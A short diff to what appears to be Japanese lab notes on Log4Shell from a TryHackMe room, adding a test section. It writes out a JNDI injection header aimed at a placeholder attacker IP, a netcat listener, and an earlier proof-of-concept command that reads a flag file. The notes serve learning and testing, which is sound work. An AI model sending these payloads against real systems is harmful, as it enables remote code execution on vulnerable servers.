@@ -561,8 +561,24 @@ python ./poc.py http://10.10.84.202:8090 cat%20/flag.txt
 
 https://tryhackme.com/room/solar
 
+https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md
+
 - `log4j < 2.16.0`
 - JNDI の悪用。NJDIは、2.16.0 で完全に無効化された。
+
+### テスト
+
+次のHTTPヘッダーを送って、接続が返れば脆弱性があると判断できる。
+
+```http
+Accept: ${jndi:ldap://<attacker-ip>:8888}
+```
+
+```sh
+nc -lvnp 8888
+```
+
+### エクスプロイト
 
 JNDI の[リファラルサーバー](https://github.com/mbechler/marshalsec)を起動。8000ポートに転送する設定。
 
